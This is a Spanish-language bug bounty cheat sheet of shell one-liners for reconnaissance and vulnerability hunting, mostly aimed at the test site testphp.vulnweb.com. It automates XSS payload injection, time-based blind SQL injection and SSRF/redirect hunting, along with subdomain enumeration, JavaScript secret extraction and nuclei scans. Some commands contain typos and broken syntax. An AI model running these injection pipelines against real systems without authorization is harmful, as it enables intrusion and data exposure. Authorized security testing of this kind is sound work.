# nulldev96_Metodology

*Provando todas las herramientas para encontar posible "XSS"* 

                |||||||||||||||||||||||||||||||_FIND "XSS" ===(BUG BOUNTY)====_||||||||||||||||||||||||||||||

    
#****_Forma rapida de busqueda _XSS_ ======> "echo | way | anew | cat | egrep | gf | qsreplace | while | curl | grep_****

     echo "testphp.vulnweb.com" | waybackurls | anew url1.txt ; cat url1.txt | egrep -iv ".(jpg|jpeg|git|css|tif|tiff|png|ttf|wolf|wolf2|ico|pdf|svg|txt|js)" | gf xss | qsreplace '"><script>confirm(1)</script>' | anew qsrepl2.json && cat qsrepl2.json | while read host do ; do curl --silent --path-as-is --insecure "$host" | grep -qs "<script>confirm(1)" && echo "$host \033[0;31mVulnerable_xss\n" || echo "$host \033[0;32mNot Vulnerable\n#";done | grep "Vulnerable_xss" | tee vuln_xss

#****_Forma rapida de busqueda _XSS_ ======> "echo | way | gf | qsreplace | while | curl | grep"_****
     
     echo "testphp.vulnweb.com" | waybackurls | gf xss | qsreplace '"><script>confirm(1)</script>' | while read host do ; do curl --silent --path-as-is --insecure "$host" | grep -qs "<script>confirm(1)" && echo "$host \033[0;31mVulnerable_xss\n" || echo "$host \033[0;32mNot Vulnerable\n#";done | grep "Vulnerable_xss"
              
#****_Forma rapida de busqueda _XSS_ ======> "echo | way | anew | cat | egrep | kxss | sed | dalfox"_****
      
      echo "testphp.vulnweb.com" | waybackurls | anew url1.txt ; cat url1.txt | egrep -iv ".(jpg|jpeg|git|css|tif|tiff|png|ttf|wolf|wolf2|ico|pdf|svg|txt|js|html)" > filtrado_url.txt && cat filtrado_url.txt | kxss | sed 's/=.*/=/' | sed 's/URL: //' | tee filtre.txt&& cat filtre.txt | dalfox pipe

#****_Forma rapida de busqueda _XSS_ ======>  "echo | way | egrep | kxss | sed | dalfox"_****
      
      echo "testphp.vulnweb.com" | waybackurls | egrep -iv ".(jpg|jpeg|git|css|tif|tiff|png|ttf|wolf|wolf2|ico|pdf|svg|txt|js|html)" |  kxss | sed 's/=.*/=/' | sed 's/URL: //' | dalfox pipe

#****_Forma rapida de busqueda _XSS_ ======>  "echo | way | httpx | katana | kxss | sed | dalfox"_****

      echo "testphp.vulnweb.com" | httpx -silent | katana d 20 | Gxss -c 100 -p Xss | sort -u | dalfox pipe --skip-bav

#****_Forma rapida de busqueda _XSS_ ======>  "echo | way | httpx | Gxss | dalfox"_**** 
     
     echo "testphp.vulnweb.com" | waybackurls | httpx -silent | Gxss -c 100 -p Xss | sort -u | dalfox p     

#****_Forma rapida de busqueda _XSS_ ======>  "Paramspider.py | qsreplace | airixss | grep"_****
     
     /home/josema96/HackerOne/hunters_tools/TOOLS_funsion/tool_Search_parametro/ParamSpider/paramspider.py -d testphp.vulnweb.com -o param.txt ; cat output/param.txt | qsreplace '"><svg onload=confirm(1)>' | airixss -payload "confirm(1)" | grep "Vulnerable To XSS "

#****_Forma rapida de busqueda _XSS_ ======>  "echo | way | dalfox"_****
     
     echo "http://testphp.vulnweb.com" | waybackurls | dalfox pipe

#****_Forma rapida de busqueda _XSS_ ======>   "way | urldedupe | bhedak |  airixss | egrep"_****
     
     waybackurls testphp.vulnweb.com | urldedupe -qs | bhedak '"><svg onload=confirm(1)>' | airixss -payload "confirm(1)" | egrep -v 'Not'

#****_Forma rapida de busqueda _XSS_ ======>   "echo | way | gf | uro | httpx | qsreplace | airixss | grep"_****
     
     echo testphp.vulnweb.com | waybackurls | gf xss | uro | httpx -silent | qsreplace '"><svg onload=confirm(1)>' | airixss -payload "confirm(1)" | grep "Vulnerable To XSS"

#****_Forma rapida de busqueda _XSS_ ======>   "echo | way | gf | uro | qsreplace | airixss | grep"_****
     
     echo testphp.vulnweb.com | waybackurls | gf xss | uro | qsreplace '"><img src=x onerror=alert(1);>' | freq | egrep -v 'Not' 

#****_Forma rapida de busqueda _XSS_ ======>    "waymore.py | cat | gf | dalfox"_****
     
     python3 /root/waymore/waymore.py  -i testphp.vulnweb.com -mode U && cat /root/waymore/results/testphp.vulnweb.com/waymore.txt | gf xss | Gxss | dalfox pipe

#****_Forma rapida de busqueda _XSS_ ======>   "echo | cariddi | qsreplace | grep | airixss | grep"_****
     
     echo "http://testphp.vulnweb.com" | cariddi | qsreplace '"><svg onload=confirm(1)>' | grep "=" | airixss -payload "confirm(1)" | grep "Vulnerable To XSS "

#****_Forma rapida de busqueda _XSS_ ======>   "waymore | cat | anew | qsreplay | airixss | grep"_****
     
     python3 /root/waymore/waymore.py  -i testphp.vulnweb.com -mode U && cat /root/waymore/results/testphp.vulnweb.com/waymore.txt |  anew | qsreplace '"><svg onload=confirm(1)>' | airixss -payload "confirm(1)" | grep "Vulnerable To XSS "

#****_Forma rapida de busqueda _XSS_ ======>   "waymore | cat | gf xss | qsreplay | freq | grep"_****
     
     python3 /root/waymore/waymore.py  -i testphp.vulnweb.com -mode U && cat /root/waymore/results/testphp.vulnweb.com/waymore.txt | gf xss | uro | qsreplace '"><img src=x onerror=alert(1);>' | freq | egrep -v 'Not'

#****_Forma rapida de busqueda _XSS_ ======>  "katana | urldedupe | bhedak | airixss | egrep"_****
     
     katana -u http://testphp.vulnweb.com -o crawlin.txt;cat crawlin.txt | urldedupe -qs | bhedak '"><svg onload=confirm(1)>' | airixss -payload "confirm(1)" | egrep -v 'Not'


##############################################################################################

  |||||||||||||||||||||||||||||||_FIND "XSS_BLING" ===(BUG BOUNTY)====_||||||||||||||||||||||||||||||

#****_Forma rapida de busqueda _XSS_ ======>  "echo | way | gf | qsreplace | jeecves | grep"_****
     
     echo "http://testphp.vulnweb.com" | waybackurls | gf xss | qsreplace "(select(0)from(select(sleep(5)))v)" | jeeves --payload-time 5 | grep "Vulnerable To Time-Based SQLI"

#****_Forma rapida de busqueda _XSS_ ======>   "echo | way | jeeves | grep"_****   
     
     echo "http://testphp.vulnweb.com" | waybackurls | jeeves --payload-time 5 | grep "Vulnerable To Time-Based"

#****_Forma rapida de busqueda _XSS_ ======>   "echo | way | gf | qsreplace | jeeves | grep"_**** 
     
     echo "http://testphp.vulnweb.com" | waybackurls | gf xss | qsreplace "(select(0)from(select(sleep(5)))v)" | jeeves -t 5 -H "Testing: testing;OtherHeader: Value;Other2: Value" | grep "Vulnerable To Time-Based"

#****_Forma rapida de busqueda _XSS_ ======>    "cat | Seclists | while | echo | gau | qsreplace | jeeves"_**** 
     
     cat /usr/share/wordlists/SecLists/Fuzzing/SQLi/Generic-BlindSQLi.fuzzdb.txt | while read payload;do echo http://testphp.vulnweb.com | gau | qsreplace $payload | jeeves -t 5;done

#****_Forma rapida de posible busqueda SSRF_****
    
    echo "testphp.vulnweb.com" | subfinder | waybackurls | gf ssrf
    python3 paramspider.py -d testphp.vulnweb.com -o tst ; cat output/tst | gf ssrf

##############################################################################################

# Time_tool

#****_Forma rapida de busqueda subdominio  ====>  sublist3r | amass | subfinder | assetfinder |findomain | crobat | anubis | turbolist3r.py | python3 SubDomainizer.py | acamar.py | ctfr.py | github-subdomains.py_****

    amass enum -d $dominio | sort -u | anew amass.txt
    assetfinder --subs-only $dominio | sort -u | anew sub/asset.txt
    findomain -t $dominio | sort -u | anew findo.txt
    subfinder -d $dominio | sort -u | anew subfin.txt
    sublist3r -d $dominio -o sublis.txt
    crobat -s $dominio | sort -u | anew crob.txt
    turbolist3r.py -d $dominio -o turbo.txt
    ctfr.py -d $dominio -o ctfr.txt
    anubis -t $dominio  -S | sort -u | anew anub.txt
    acamar.py $dominio 2> /dev/null | grep $dominio | sort -u | anew acam.txt
    github-subdomains.py -t {token} -d $dominio | sort -u | anew git_su.txt
    #Registrarse en "https://recon.dev" para obtener la api y sacar subdomain con el comando "CURL"
    curl "https://recon.dev/api/search?key={API}domain={domain}" | jq -r '.[].rawDomains'  set 's/ //g' | anew | httpx -silent | xargs -P3 I@ gospider -d 0 -s @ -c 5 -t 100 --blacklist jpg,jpeg,git,css,tif,tiff,png,ttf,wolf,wolf2,ico,pdf,svg,txt | grep -Eo '(http|https)://[^/"]+' | anew sub.txt

#****_Forma rapida de busqueda subdominio_****

    sublist3r -d {dominio} >> sub.txt  | amass enum -d {dominio}  >> sub.txt | subfinder -d {dominio} >> sub.txt | assetfinder --subs-only {dominio} >> sub.txt | findomain -t {dominio}  >> sub.txt | crobat -s {dominio} >> sub.txt | anubis -t {dominio}  -S  >> anub.txt | turbolist3r.py -d {dominio} >> sub.txt | python3 SubDomainizer.py -u {dominio} >> sub.txt | acamar.py {dominio} 2> /dev/null | grep $dominio >> sub.txt | ctfr.py -d {dominio} >> subdomain.txt | github-subdomains.py -t {token} -d {dominio} >> sub.txt | cat sub.txt | anew subdomain.txt ; rm sub.txt && cat subdomain.txt

#****_Brute-Force Subdominio_****

    amass enum -brute -d example.com
    shuffledns -d $dominio -w $wordlists -r $resolvers | sort -u | anew $dominio/sub/shuff.txt
    puredns bruteforce $wordlists $dominio -r $resolvers | tee $dominio/sub/pure.txt
    
#****_Web crawling subdomain_****

    echo "vulnweb.com" | subfinder | waybackurls | unfurl domains | anew subdomain.txt
    echo "vulnweb.com" | waybackurls | unfurl domains | anew domain && cat domain.txt | subfinder | gauplus --subs | anew sub.txt
    python3 waymore.py -i domain.com -mode U | unfurl domains | anew sundomain.txt

 #****_Alteration/Permutations Scaning Y resolver o validar dns_****
 
     echo "testphp.vulnweb.com" | subfinder  -silent | anew sub.txt && gotator -sub sub.txt -perm permutations.txtt -depth 1 -numbers 10 -mindup -adv -md | tee permsub.txt ; puredns resolve permsub.txt -r resolvers.txt | anew valido.tx
     assetfinder -subs-only testphp.vulnweb.com | tee sub.txt ; gotator -sub sub.txt -perm permutations.txtt -depth 1 -numbers 10 -mindup -adv -md > perm.txt ; puredns resolve perm.txt -r resolvers.txt | anew valido.tx
     echo "testphp.vulnweb.com" | subfinder  -silent | massdns -r resolvers.txt -t A -o S -w resul.txt
     echo "testphp.vulnweb.com" | subfinder  -silent | altdns -i subdomain.txt -o data_output -w worl.txt -r -s results_output.txt

 
#****_Forma rapida de busqueda o crawling History_URL ====>  "echo | waybackurls | gau | gauplus | cariddi | katana"_**** 
    
    echo "testphp.vulnweb.com" | waybackurls | anew url1.txt 
    echo "http://testasp.vulnweb.com/" | gau | anew url.txt
    echo "http://testasp.vulnweb.com/" | gauplus | anew url.txt
    echo "http://testphp.vulnweb.com" | cariddi  | anew url.txt
    echo "vulnweb.com" | subfinder -silent | httpx -silent | cariddi -intensive
    katana -u http://testphp.vulnweb.com -o crawlin.txt
    python3 /root/waymore/waymore.py  -i testphp.vulnweb.com -mode U && cat /root/waymore/results/testphp.vulnweb.com/waymore.txt
    subfinder -d vulnweb.com -silent -all | httpx -silent | katana -d 5 -silent | grep -iE '\.js'| grep -iEv '(\.jsp|\.json)'
    subfinder -d vulnweb.com -silent -all | httpx -silent | katana -d 5 -silent -em js,jsp,json
    #Multiple URL Input (comma-separated)
    katana -u http://testphp.vulnweb.com,http://testasp.vulnweb.com
    #List Input
    katana -list url_list.txt
    

#****_CREANDO UN SCRIPT QUE AUTOMATICE LA URL DEL SITIOS WEB ANTIGUA_****

    !/usr/bin/bash

    #Extrae todas la url de un sitios web y filtarar  loa mas intresante

    domain=$1

    extraer_URL(){
            mkdir -p $domain $domain/URL
            echo $domain | gauplus | tee $domain/URL/gau.txt
            cat $domain/URL/gau.txt | sort -u | tee $domain/URL/u.txt
    #egrep -iv ".(jpg|jpeg|png|svg|git|woff|woff2|pdf|ico|tif|tiff|css)" | tee $domain/URL/url_filt.txt
            echo $domain | waybackurls | tee $domain/URL/wayback1.txt
            cat $domain/URL/wayback1.txt | sort -u | tee $domain/URL/a.txt
    #egrep -iv ".(jpg|jpeg|png|svg|git|woff|woff2|pdf|ico|tif|tiff|css)" | tee $domain/URL/url1.txt
            cat $domain/URL/*.txt 2> /dev/null > $domain/URL/all_url
            rm $domain/URL/*.txt 2> /dev/null

    }
    extraer_URL
    
#****_Forma rapida de busqueda de archivo _.js__****
     
    #jsbeautify.py - Javascript embellecer
       python3 jsbeautify https://www.paypalobject.com/test.js paypal/manualAnalyzis.js
    #SEARCH .json
       gospider -s https://twitch.tv --js | grep -E "\.js(?:onp?)?$" | awk '{print $5}' | fff | grep -v 404
    #SEARCH .json filter anti-burl
       gospider -s https://twitch.tv --js | grep -E "\.js(?:onp?)?$" | awk '{print $5}' | anti-burl | grep -v 404
    #SEARCH .json filter fff
       echo "http://testphp.vulnweb.com" | waybackurls | grep -E "\.js(?:onp?)?$"  | fff | grep -v 404
       echo "http://testphp.vulnweb.com" | gau | grep -E "\.js(?:onp?)?$" | fff | grep -v 404 
       echo "http://testphp.vulnweb.com" | gauplus | grep -E "\.js(?:onp?)?$" | fff | grep -v 404
       echo "testphp.vulnweb.com" | gau  | subjs | fff | grep -v 404
    #getSrc - Herramienta para extraer enlaces de secuencias de comandos, lo bueno de esta herramienta es que crea una URL absoluta.
       python3 getSrc.py http://vulnweb.com 
    #SecretFinder: herramienta para descubrir datos confidenciales como apikeys, accesstoken, autorizaciones, jwt, etc. en un archivo js
       echo "vulnweb.com" | subfinder | waybackurls | grep -E "\.js(?:onp?)?$" | anew vulnJS.txt | cat vulnlJS.txt | xargs -n2 -I @ bash -c 'echo -e "\n[URL] @\n";python3 linkfinder.py -i @ -o cli' >> paypalJsSecrets.txt
    "antiburl/antiburl.py: toma las URL en la entrada estándar, las imprime en la salida estándar si devuelven un 200 OK. antiburl.py es una versión avanzada
       echo "vulnweb.com" | subfinder | waybackurls | grep -E "\.js(?:onp?)?$" | anew  archi.js.txt | cat archi.js.txt | antiburl > vulnJSAlive.txt | cat vulnJSAlive.txt | python3 antiburl.py -A -X 404 -H 'header:value' 'header2:value2' -N -C "mycookies=10" -T 50 
    #ffuf - herramienta para fuzzing, también la uso para fuzzing de archivos js
       ffuf -u http://testphp.vulnweb.com/js/ -w jsWordlist.txt -t 200 
    #gitHubLinks.py: encuentre nuevos enlaces en GitHub, en este caso solo enlaces javascript
       python3 gitHubLinks.py testphp.vulnweb.com | grep -iE '\.js' | anew arch.js.txt
    #collector.py - Split linkfinder stdout in jsfile,urls,params..etc
       python3 linkfinder.py -i http://testphp.vulnweb.com/a.js -o cli | python3 collector.py output
    #SEARCH .json subdomain
       assetfinder -subs-only vulnweb.com | waybackurls | grep -E "\.json(?:onp?)?$" | hakcheckurl | grep -v 404
    #Usando búsqueda de chaos js
       chaos -d att.com | httpx -silent | xargs -I@ -P20 sh -c 'gospider -a -s "@" -d 2' | grep -Eo "(http|https)://[^/"].*.js+" | sed "s#]
    #Usando echo | wayback | grep | sort | >
       echo "testphp.vuln.com" | waybackurls | grep -iE '\.js' | grep -ivE '\.json' | sort -u  > j.txt
    #SEARCH .js USING
       assetfinder -subs-only testphp.vulnweb.com -silent | httpx -timeout 3 -threads 300 --follow-redirects -silent | xargs -I% -P10 sh -c 'hakrawler -plain -linkfinder -depth 5 -url %' | awk '{print $3}' | grep -E "\.js(?:onp?)?$"  | hakcheckurl | grep -v 404
    #linkfinder: esta herramienta es excelente, generalmente la uso para buscar rutas, enlaces, combinado con y Collector.py es increíble.
       echo "vulnweb.com" | subfinder | waybackurls | grep -E "\.js(?:onp?)?$" | arch.js.txt  cat arch.js.txt | xargs -n2 -I @ bash -c 'echo -e "\n[URL] @\n";python3 linkfinder.py -i @ -o cli' >> JSPaths_Url.txt | cat JSPaths_Url.txt | grep -iv '[URL]' | anew JSLink_Url.txt | cat JSLink_Url.txt | python3 collector.py output
    #Recopila .js gau+wayback+gospider y hace un análisis del js.
       cat dominios | gau |grep -iE '\.js'|grep -iEv '(\.jsp|\.json)' >> gauJS.txt ; cat dominios | waybackurls | grep -iE '\.js'|grep -iEv '(\.jsp|\.json)' >> waybJS.txt ; gospider -a -S dominios -d 2 | grep -Eo "(http|https)://[^/\"].*\.js+" | sed "s#\] \- #\n#g" >> gospiderJS.txt ; cat gauJS.txt waybJS.txt gospiderJS.txt | sort -u >> saidaJS ; rm -rf *.txt ; cat saidaJS | anti-burl |awk '{print $4}' | sort -u >> 200Js.txt ; xargs -a 200Js.txt -n 2 -I@ bash -c "echo -e '\n[URL]: @\n'; python3 linkfinder.py -i @ -o cli" ; cat 200Js.txt  | python3 collector.py output ; rush -i output/urls.txt 'python3 SecretFinder.py -i {} -o cli | sort -u >> output/resultJSPASS'   
    #BurpSuite: extrae el contenido entre las etiquetas del script, generalmente uso getScriptTagContent.py
    #después de esto guarda el contenido y usa linkfinder
       python3 linkfinder.py -i burpscriptscontent.txt -o cli
    #availableForPurchase.py: esta herramienta busca si un dominio está disponible para ser comprado, esta herramienta combinada con el buscador de enlaces y el recopilador es realmente poderosa. Muchas veces los desarrolladores por distracción se equivocan al escribir el dominio, tal vez el dominio esté importando un archivo javascript externo, etc.
       cat paypalJS.txt|xargs -I @ bash -c 'python3 linkfinder.py -i @ -o cli' | python3 collector.py output | cat output/urls.txt | python3 availableForPurchase.py
    #allJsToJson.py: realiza una solicitud a las URL que se le pasan y recupera todos los archivos js y me los guarda en un archivo json
       cat myPaypalUrls.txt | python3 allJsToJson.py output.json | cat output.json  

#****_Forma rapida de busqueda redireccion con "GF"_****

       assetfinder --subs-only vulnweb.com | sort -u | anew asset.txt | cat asset.txt | gf redirect | sed 's/^tesla.txt:[0-9]*[0-9]://g' | sed 's/no$/https://google.com/g' | httpx -silent -status-code -title -threads 100

#****_Forma rapida de enumerar api con "assetfinder" "httpx" "aquatone"_****

       assetfinder --subs-only {dominio} | sort -u | anew asset.txt | cat asset.txt | httpx -silent -path /api/ -title -status-code | grep -i "den" | anew api.txt | cat api.txt  | aquatone

#****_Forma rapida de enumerar subdominio de *department of Defense* con "curl" "crt.sh" "xargs"_****

       curl -s "https://crt.sh/?q=.mil" | grep .mil | tr 'B' '\n' | tr 'R>\/<TD\/' ' ' | xargs -I @ echo @ | sort -u | anew | tee sub_.mil.txt

#****_Forma rapida de enumerar PUERTO ABIERTO con "subfinder" "naabu"_****

       subfinder -d testphp.com -silent | xargs -I@ sh -c 'naabu -host @ -silent'

#****_Forma rapida de enumerar PARAMETRO con "subfinder" "PARAMSPIDER" "xargs" "rust"_****

       arjun -u http://testphp.vulnweb.com -m Post --stable | anew test.txt
       python3 paramspider.py -d testphp.vulnweb.com --output param.txt
       subfinder -d testphp.com -silent | anew sub.txt | xargs -a sub.txt -I@ sh -c 'paramspider.py -d @ -l high | -o param.txt' ; cat ouput/param.txt
       subfinder -d testphp.com -silent | anew sub.txt | rust -i sub.txt 'paramspider.py -d {} -l high | -o param.txt' ; cat ouput/param.txt'

****_Forma rapida de enumerar subdominio con "subfinder" "xargs"_****
       
       subfinder -d testphp.com -silent | anew sub.txt | xargs -a vulnweb.com -I@ sh -c 'subfinder -d @ | anew domain.txt
       #Forma rapida de enumerar subdominio con "subfinder" "xargs" "crt.sh"
       subfinder -d testphp.com -silent | anew sub.txt | xargs -a sub.txt -I@ sh -c 'curl -s "https://crt.sh/?q=%25.vulnweb.com&output=json" | jq -r '.[].name_value'' | sed 's/\*\.//g' | anew sub.txt

#****_Forma rapida de busqueda de "Donimio" Relacionada a un "ASN o Sistema Autónomo" usando "amass"_**** 

       amass intel -org vulnweb.com | awk -F, '{print $1}' | anew asn.txt ; for i in $(cat asn.txt);do amass intel -asn $i;done | anew dominio.txt
       amas intel -org vulnwe.com --max-dns-queries 2500 | awk -F, '{print $1}' | anew asn.txt ; cat asn.txt ORS="," | set 's/.$//g' | xargs -P3 -I@ -d "." amass intel -asn @ --max-dns-queries 2500 | anew dominio.txt
       #Fuentes de busqueda de "ASN"
       bgp.he.net} https://bgp.he.net
       
****_Forma rapida de resolverDNS de varios subdominio dado_****

       subfinder -d vulnweb.com -silent | anew sub.txt | puredns resolve sub.txt -r resolvers.txtt | anew subreal.txt

****_Forma rapida de extraer Rango de Red usando "mapcidr"_****

    subfinder -d vulnweb.com -silent | anew sub.txt | cat sub.txt | dnsx -silent -a -resp-only | anew ip.txt ; cat ip | mapcidr -aggregate-approx | anew rangoRed.txt
    
#****_Forma rapida de extraer Rango_de_Red  o Ip/Range usando  la tool "amass" y "asn"_****
    
    #Búsqueda de números de sistemas autónomos con estadísticas de BGP, interconexión e información de prefijos 

    amass intel -org vulnweb.com | awk -F, '{print $1}' | anew asn.txt ; for i in $(cat asn.txt);do asn $i;done | anew dominio.txt 
    
****_Forma rapida de extraer dominio o sub de un "Rango de Red" mediante consulta "ptr"_****

    subfinder -d vulnweb.com -silent | anew sub.txt | cat sub.txt | dnsx -silent -a -resp-only | anew ip.txt ; cat ip | mapcidr -aggregate-approx | anew rangoRed.txt ; cat rangoRed.txt | mapcidr -cl rangoRed.txt -aggregate | dnsx -silent -resp-only -ptr | anew sub.txt
    #extraer subdominio de un solo "Rango de Red" mediante consulta "ptr"
    mapcidr -cidr 44.228.249.3/32 -silent | dnsx -silent -resp-only -ptr

****_Forma rapida de extraer dominio de un solo "Rango de Red" mediante "prips"_****

    prips 35.81.188.86/32 | hakrevdns |  awk '{print $2}'  | anew domain.txt

****_Forma rapida de obtener lista de "IP" de un "Rango de Red" o subRed dado con "mapcidr"_****

    subfinder -d vulnweb.com -silent | anew sub.txt | cat sub.txt | dnsx -silent -a -resp-only | anew ip.txt ; cat ip | mapcidr -aggregate-approx | anew rangoRed.txt ; cat rangoRed.txt | mapcidr -cidr rangoRed.txt | anew ip.txt
    
    #obtener lista de "IP" de un "Rango de Red" o subRed dado con "mapcidr"
    echo 44.238.29.244/32 | mapcidr
    
#****_obtener lista de "IP" de un subdominio usando dig_****

    echo "vulnweb.com" | subfinder -silent | anew sub.txt | puredns resolve sub.txt -r resolvers.txt | anew subreal.txt ; for i in $(cat subreal.txt);do dig +short $i | grep -E "[0-9][0-9][0-9]\.[0-9][0-9][0-9]\.";done >> ip.txt

#****_obtener lista de "IP" de un subdominio usando "massdns" y "gf ip"_****

    echo "vulnweb.com" | subfinder -silent | anew sub.txt ; cat sub.txt |  massdns -r $(pwd)/resolvers.txtt -t A -o S -w massd.txt | awk '{print $3}' ; gf ip | anew >> ip.txt

****_Forma rapida de encontar "dominio" atarves de webspider usando "unfurl -u domains"_****

    echo [+] ejecutando subfinder [+] ; echo "vulnweb.com" | subfinder -silent | anew sub.txt1 ; cat sub.txt1 | httpx -silent | anew http.txt2 ; gospider -S http.txt2 --js -t 50 -d 1 --sitemap --robots -w -r | tail -1000 | anew gos.txt3 ; cat gos.txt3 | grep -Eo 'https?://[^ ]+' | sed 's/]$//' | unfurl -u domains | anew subvalido.txt4
    
****_Forma rapida de extraer "comentario interesante de un sitios web"_****

    #time-tool subfinder | cat | fhc | html-tool | anew
    subfinder -d vulnweb.com -silent | anew sub.txt && cat sub.txt | fhc | html-tool tags title a strong | anew comment.txt
    subfinder -d vulnweb.com -o s.txt && cat s.txt | fhc | html-tool comments | anew comment.txt
    cat subreal.txt | fhc | html-tool tags title a strong && find . -type f -name "*.html" | html-tool attribs src href

#****_Forma rapida de busqueda de posible Vulns usando "meg"_**** 
 
    echo "vulnweb.com" | waybackurls | unfurl domains | anew | httpx | anew host.txt ; meg path httpx_host ; cat /out/index | gf secrets | grep -i "token" 

#****_Forma rapida de busqueda de posible Vulns usando "Meg"_**** 
 
    echo "vulnweb.com" | subfinder -silent | anew sub.txt ; cat sub.txt | httpx  | anew httpxHost.txt ; meg path httpxHost.txt ; cat /out/index | grep -rnw "password"

#****_Puerto Comunes_****

        "80,81,300,443,591,593,832,981,1010,1311,2082,2087,2095,2096,2480,3000,3128,3333,4243,4567,4711,4712,4993,500",5104,5108,5800,6543,7000,7396,7474,8000,8001,8008,8014,8042,8069,8080,8081,8088,8090,8091,8118,8123,8172,8222,8243,8280,8281,8333,8443,8500,8834,8880,8888,8983,9000,9043,9060,9080,9090,9091,9200,9443,9800,9981,12443,16080,18091,18092,20720,28017"               


****_Forma rapida de encontar vulns con Nuclei usando plantillas de nuclei"_****

       subfinder -d vulnweb.com -silent | gau | anew | nuclei -t /root/nuclei-templates/vulnerabilities | anew vulns.txt
       
       #Con la funcion de "-etags" descartamos lo que no, nos interesa
       subfinder -d vulnweb.com -silent | gau | anew | nuclei -t /root/nuclei-templates/ -etags sqli,xss,rce -c 50 -o vuln-nuclei.txt
       
       #Mas eficas con "Resolver DNS" y ejecutar "gau","nuclei"
       subfinder -d vulnweb.com -silent | puredns resolve -r resolvers.txtt | anew subreal.txt ; cat subreal.txt | gau | anew nuclei -t /root/nuclei-templates/ -severity low,medium,high,critical -c 50 -o vuln-nuclei.txt 
       
       #Ejecutar nuclei a una URL o Host dado de forma directa y le especificamos con -tags lo que nos interesa escontar
       nuclei -u https://example.com -tags cve -severity critical,high -author geeknik
       #search cves
       cat url_valido.txt | nuclei -t /root/nuclei-templates/cves/ -c 50 -o cves.txt
       #search file
       cat url_valido.txt | nuclei -t /root/nuclei-templates/file/ -c 50 -o file.txt
       #search tecnologies
       cat url_valido.txt | nuclei -t /root/nuclei-templates/technologies/ -c 50 -o technologies.txt
       #search severity
       cat url_valido.txt | nuclei -t /root/nuclei-templates/ -severity low,medium,high,critical -c 50 -o vuln-nuclei.txt
       #search templates
       cat url_valido.txt | nuclei -t /root/nuclei-templates/ -c 50 -o nuclei-templates.txt

#****_Forma rapida de encontrar Vulns usando "Nuclei" y "httpx" con varios puerto comunes_****

    echo "testphp.vulnweb.com" | haktrails subdomains | anew domains ; cat domaians | httpx -silent -p 80,81,300,443,591,593,832,981,1010,1311,2082,2087,2095,2096,2480,3000,3128,3333,4243,4567,4711,4712,4993,5000,5104,5108,5800,6543,7000,7396,7474,8000,8001,8008,8014,8042,8069,8080,8081,8088,8090,8091,8118,8123,8172,8222,8243,8280,8281,8333,8443,8500,8834,8880,8888,8983,9000,9043,9060,9080,9090,9091,9200,9443,9800,9981,12443,16080,18091,18092,20720,28017 | nuclei -severity low,medium,high,critical | anew test.txt



       
